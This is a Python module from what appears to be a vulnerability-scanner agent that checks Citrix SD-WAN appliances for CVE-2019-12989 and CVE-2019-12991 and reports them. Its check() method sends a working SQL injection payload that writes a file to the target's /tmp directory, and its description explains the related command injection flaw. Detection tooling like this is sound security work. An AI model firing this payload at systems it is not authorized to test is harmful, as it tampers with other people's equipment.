"""Agent Asteroid implementation for CVE-2019-12989 and CVE-2019-12991 remarque:not tested on a live target"""
import random
import logging

import requests
from urllib3 import exceptions
from urllib3 import disable_warnings
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from ostorlab.agent.kb import kb

from agent import definitions

disable_warnings(exceptions.InsecureRequestWarning)

TIMEOUT = 10  # sec


logger = logging.getLogger(__name__)


class Exploit(definitions.Exploit):
    """
    Security Vulnerabilities in Citrix SD-WAN : CVE-2019-12989 and CVE-2019-12991.
    """

    def __init__(self, target: str):
        self.target = target

    def check(self) -> list[definitions.Vulnerability]:
        """CVE-2019-12989 :auth bypass via file write using sql injection"""
        url = (
            self.target + "/sdwan/nitro/v1/config/get_package_file?action=file_download"
        )
        headers = {"SSL_CLIENT_VERIFY": "SUCCESS"}
        token = random.randint(10000, 99999)
        json = {
            "get_package_file": {
                "site_name": "blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_"
                + str(token)
                + "';#",
                "appliance_type": "primary",
                "package_type": "active",
            }
        }
        try:
            r = requests.post(
                url, headers=headers, json=json, verify=False, timeout=TIMEOUT
            )
        except requests.exceptions.ReadTimeout as e:
            logger.error("Error : %s", e)
            return []
        # error is expected
        expected = {
            "status": "fail",
            "message": "Invalid value specified for site_name or appliance_type",
        }
        if r.status_code == 400 and r.json() == expected:
            vulnerability = self.generate_vulnerability_object()
            return [vulnerability]
        else:
            return []

    def generate_vulnerability_object(self) -> definitions.Vulnerability:
        entry = kb.Entry(
            title="Security Vulnerabilities in Citrix CVE-2019-12989 and CVE-2019-12991",
            risk_rating="critical",
            short_description="Citrix SD-WAN Appliance 10.2.2 - Authentication Bypass / Remote Command Execution",
            description="CVE-2019-12989: The cgi-bin/sdwanrestapi/getpackagefile.cgi Perl script contains a SQL injection vulnerability that can be exploited by a remote, unauthenticated attacker."
            "Input validation is not applied before incorporating user input in a SQL query. By exploiting this vulnerability with a crafted HTTP request, an attacker is able to"
            "write to (and create) files in locations writable by the 'mysql' user. "
            "CVE-2019-12991: Installpatch.cgi suffers from a command injection vulnerability. This vulnerability can be exploited by a remote, authenticated attacker to execute OS commands with root privileges."
            "Specifically, the 'installfile' parameter value is not validated prior to using it in a call to the Perl system() function.",
            references={
                "Tenable Research": "https://www.tenable.com/security/research/tra-2019-32",
                "Medium - Tenable TechBlog": "https://medium.com/tenable-techblog/an-exploit-chain-against-citrix-sd-wan-709db08fb4ac",
                "Citrix Support Article": "https://support.citrix.com/article/CTX251987",
            },
            recommendation="""
                 These vulnerabilities have been addressed in the following software versions:
                 NetScaler SD-WAN Center 10.0.8 and NetScaler SD-WAN 10.0.8 Appliance
                 Citrix SD-WAN Center 10.2.3 and Citrix SD-WAN 10.2.3 Appliance
                 Citrix strongly recommends that customers using vulnerable software upgrade their SD-WAN Center management console or SD-WAN appliance to the new version or later as soon as possible.
                 """,
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=False,
            targeted_by_ransomware=False,
            targeted_by_nation_state=False,
        )
        technical_detail = (
            f"{self.target} is vulnerable to CVE-2019-12989 and CVE-2019-12991"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
